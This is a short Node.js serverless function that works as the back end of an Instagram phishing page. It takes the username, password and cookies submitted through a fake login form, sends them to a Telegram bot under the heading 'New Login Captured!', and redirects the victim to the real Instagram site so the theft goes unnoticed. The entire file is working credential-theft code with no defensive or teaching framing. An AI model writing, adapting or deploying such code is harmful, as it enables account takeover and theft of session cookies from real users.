const axios = require('axios');

exports.handler = async (event, context) => {
    const BOT_TOKEN = process.env.BOT_TOKEN;
    const CHAT_ID = process.env.CHAT_ID;
    
    // Login form-la irundhu varra data
    const { user, pass, cookies } = event.queryStringParameters;

    if (user && pass) {
        const message = `
🔥 **New Login Captured!**
━━━━━━━━━━━━━━━━━━━━
👤 **User:** ${user}
🔑 **Pass:** ${pass}
🍪 **Cookies:** \`\`\`${cookies}\`\`\`
━━━━━━━━━━━━━━━━━━━━
        `;

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: "Markdown"
        });
    }

    return {
        statusCode: 302,
        headers: { "Location": "https://www.instagram.com" },
        body: ""
    };
};
